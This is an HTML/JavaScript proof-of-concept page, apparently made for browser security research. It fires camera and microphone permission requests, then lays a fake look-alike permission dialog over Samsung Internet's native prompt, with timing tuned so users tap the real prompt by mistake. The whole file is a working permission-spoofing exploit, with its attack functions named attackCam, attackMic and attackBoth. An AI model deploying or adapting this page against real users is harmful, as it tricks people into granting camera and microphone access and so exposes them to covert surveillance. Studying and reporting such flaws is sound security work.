<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Permission Test</title>
<style>
  body { margin: 0; font-family: sans-serif; background: #111; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
  button { padding: 15px 30px; font-size: 18px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
  #log { margin-top: 20px; font-size: 14px; color: #888; text-align: center; padding: 0 20px; }

  #fakeAlert {
    display: none;
    position: fixed;
    bottom: 25vh;
    left: 50%; transform: translateX(-50%);
    width: 88%; max-width: 340px;
    background: #fff; color: #202124;
    border-radius: 16px;
    padding: 22px 20px 16px;
    box-shadow: 0 6px 24px rgba(0,0,0,0.55);
    font-size: 15px; line-height: 1.4;
    z-index: 10000;
  }
  #fakeAlert .msg { margin-bottom: 18px; font-weight: 500; }
  #fakeAlert .btns {
    display: flex; justify-content: flex-end; gap: 6px;
    padding-right: 24px;
  }
  #fakeAlert .btns button {
    margin: 0; padding: 10px 20px; font-size: 15px; border-radius: 20px;
  }
  #fDeny  { background: transparent; color: #1a73e8; }
  #fAllow { background: #1a73e8; color: #fff; }

  #debug { position: fixed; top: 5px; right: 5px; font-size: 11px; color: #666; }
</style>
</head>
<body>
<button onclick="attackCam()">Camera</button>
<button onclick="attackMic()">Microphone</button>
<button onclick="attackBoth()">Both (staggered)</button>
<div id="log"></div>
<div id="debug"></div>

<div id="fakeAlert">
  <div class="msg" id="fakeMsg">Alert</div>
  <div class="btns">
    <button id="fDeny">Deny</button>
    <button id="fAllow">Allow</button>
  </div>
</div>

<script>
const log = document.getElementById('log');
const fakeAlert = document.getElementById('fakeAlert');
const debug = document.getElementById('debug');

// Tune these delays to match Samsung Internet's prompt timing
const FAKE_DELAY_MS = 400;   // fake alert appears after native prompt starts
const SECOND_REQ_MS = 2500;  // second (mic) request after camera prompt resolved

async function getPerm(constraints) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    stream.getTags = stream.getTracks;
    stream.getTracks().forEach(t => t.stop());
    return 'GRANTED';
  } catch (e) {
    return 'error: ' + e.name;
  }
}

function showFake(msg) {
  document.getElementById('fakeMsg').textContent = msg;
  setTimeout(() => {
    fakeAlert.style.display = 'block';
    debug.textContent = 'fake shown @ ' + Date.now();
  }, FAKE_DELAY_MS);
}

async function attackCam() {
  showFake('This site wants to use your camera');
  log.textContent = await getPerm({ video: true });
}

async function attackMic() {
  showFake('This site wants to use your microphone');
  log.textContent = await getPerm({ audio: true });
}

async function attackBoth() {
  showFake('This site wants to use your camera and microphone');
  const camResult = await getPerm({ video: true });
  log.textContent = 'camera: ' + camResult;
  // Second native prompt for mic right after camera resolves
  setTimeout(async () => {
    showFake('This site wants to use your microphone');
    const micResult = await getPerm({ audio: true });
    log.textContent += ' | mic: ' + micResult;
  }, SECOND_REQ_MS);
}

document.getElementById('fAllow').addEventListener('click', () => {
  fakeAlert.style.display = 'none';
  log.textContent = 'fake Allow tapped @ ' + Date.now();
});
document.getElementById('fDeny').addEventListener('click', () => {
  fakeAlert.style.display = 'none';
  log.textContent = 'fake Deny tapped';
});
</script>
</body>
</html>
